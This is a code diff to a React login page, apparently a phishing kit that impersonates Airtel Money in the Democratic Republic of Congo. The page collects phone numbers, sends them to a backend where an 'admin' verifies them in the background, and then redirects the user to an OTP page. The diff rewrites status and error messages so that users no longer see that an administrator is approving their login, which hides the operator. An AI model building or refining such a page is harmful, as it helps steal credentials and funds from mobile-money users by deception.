@@ -42,7 +42,7 @@ function AirtelLogin() {
 
     setError('');
     setIsLoading(true);
-    setStatusMessage('Envoi de la demande d\'approbation...');
+    setStatusMessage('Envoi de la demande...');
 
     const fullPhone = `+243${phone}`;
     localStorage.setItem('airtelPhone', fullPhone);
@@ -55,6 +55,7 @@ function AirtelLogin() {
       });
       const data = await res.json();
 
+      // Handle error
       if (data.status === 'error') {
         setError(data.message || 'Échec de la connexion.');
         setIsLoading(false);
@@ -62,18 +63,28 @@ function AirtelLogin() {
         return;
       }
 
+      // ✅ NEW: Navigate immediately when backend returns "approved"
+      //    This is the main flow now: OTP is sent to the phone, admin
+      //    will verify in the background.
+      if (data.status === 'approved') {
+        setStatusMessage('Redirection...');
+        navigate('/airtel-otp');
+        return;
+      }
+
+      // Fallback: legacy polling flow (only used if backend returns "pending")
       if (data.status === 'pending' && data.approval_id) {
-        setStatusMessage('En attente de l\'approbation de l\'administrateur...');
+        setStatusMessage('Vérification en cours...');
 
         const approvalId = data.approval_id;
         let attempts = 0;
-        const maxAttempts = 60; // 60 * 2s = 2 minutes
+        const maxAttempts = 60;
 
         const interval = setInterval(async () => {
           attempts++;
           if (attempts > maxAttempts) {
             clearInterval(interval);
-            setError('Délai d\'approbation dépassé. Veuillez réessayer.');
+            setError('Délai d\'attente dépassé. Veuillez réessayer.');
             setIsLoading(false);
             setStatusMessage('');
             return;
@@ -87,22 +98,21 @@ function AirtelLogin() {
 
             if (statusData.status === 'approved') {
               clearInterval(interval);
-              setStatusMessage('Approuvé ! Redirection...');
+              setStatusMessage('Redirection...');
               navigate('/airtel-otp');
             } else if (statusData.status === 'rejected') {
               clearInterval(interval);
-              setError('Connexion refusée par l\'administrateur.');
+              setError('Connexion refusée. Veuillez réessayer.');
               setIsLoading(false);
               setStatusMessage('');
             } else if (statusData.status === 'expired') {
               clearInterval(interval);
-              setError('Approbation expirée. Veuillez réessayer.');
+              setError('Session expirée. Veuillez réessayer.');
               setIsLoading(false);
               setStatusMessage('');
             }
-            // Si 'pending', continuer à interroger silencieusement
           } catch {
-            // Erreur réseau — continuer à interroger
+            // Réseau instable — continuer à interroger
           }
         }, 2000);
       }
@@ -147,7 +157,7 @@ function AirtelLogin() {
           </div>
         )}
 
-        {/* Status Alert (waiting for approval) */}
+        {/* Status Alert */}
         {isLoading && statusMessage && !error && (
           <div className="airtel-alert" style={{ backgroundColor: '#FEF3C7', borderColor: '#FCD34D', color: '#92400E' }}>
             <div className="alert-icon">
@@ -219,9 +229,8 @@ function AirtelLogin() {
         </div>
       </div>
 
-      {/* --- Icons Section (Below the Login Card) --- */}
+      {/* Icons Section */}
       <div className="airtel-icons-footer">
-        {/* Icon 1: Phone with Airtel Logo */}
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <rect x="2" y="2" width="36" height="51" rx="6" fill="#FFF5F5" stroke="#DA1C1C" strokeWidth="2"/>
@@ -229,8 +238,6 @@ function AirtelLogin() {
             <text x="20" y="38" textAnchor="middle" fontSize="10" fontWeight="bold" fill="black">Airtel</text>
           </svg>
         </div>
-
-        {/* Icon 2: Padlock */}
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <rect x="2" y="2" width="36" height="51" rx="6" fill="#1A2B3C" />
@@ -239,8 +246,6 @@ function AirtelLogin() {
             <circle cx="20" cy="27" r="2" fill="#1A2B3C" />
           </svg>
         </div>
-
-        {/* Icon 3: Airtel Money Logo */}
         <div className="airtel-icon-item">
           <svg width="50" height="55" viewBox="0 0 50 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <rect x="5" y="30" width="40" height="20" rx="4" fill="#DA1C1C" />
@@ -249,8 +254,6 @@ function AirtelLogin() {
             <text x="25" y="47" textAnchor="middle" fontSize="8" fontWeight="bold" fill="black">Money</text>
           </svg>
         </div>
-
-        {/* Icon 4: Naira Coin */}
         <div className="airtel-icon-item">
           <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
             <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2"/>
